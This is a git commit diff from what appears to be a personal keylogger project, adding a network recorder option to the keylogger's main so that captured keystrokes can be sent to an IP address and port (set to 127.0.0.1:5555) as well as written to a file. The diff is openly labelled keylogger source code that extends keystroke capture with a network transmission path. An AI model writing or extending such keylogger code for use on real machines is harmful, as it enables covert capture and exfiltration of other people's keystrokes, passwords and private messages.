742fb055a808a6b5e383266107ace2d5f3d332d5
ivan-guerra <ivan.eduardo.guerra@gmail.com>
2023-11-06 21:16:57 -0800

    Integrate the network recorder and its options into the keylogger's main.

--- src/keylogger/keylogger.cpp
+++ src/keylogger/keylogger.cpp
@@ -8,12 +8,15 @@
 
 enum RecorderType {
   kText = 0,
+  kNetwork,
 };
 
 #define RECORDER_KEY_LIMIT 8
 #define RECORDER_TYPE RecorderType::kText
 
 #define RECORDER_FILE_PATH "/home/ieg/dev/keylogger/bin/keys.txt"
+#define RECORDER_IP "127.0.0.1"
+#define RECORDER_PORT 5555
 
 void PrintErrAndExit(const std::string& err_msg) {
   std::cerr << "error: " << err_msg << std::endl;
@@ -27,6 +30,10 @@ int main() {
     case RecorderType::kText:
       recorder = std::make_unique<keylogger::FileRecorder>(RECORDER_KEY_LIMIT,
                                                            RECORDER_FILE_PATH);
+      break;
+    case RecorderType::kNetwork:
+      recorder = std::make_unique<keylogger::NetworkRecorder>(
+          RECORDER_KEY_LIMIT, RECORDER_IP, RECORDER_PORT);
       break;
     default:
       PrintErrAndExit("unknown recorder type -> " +
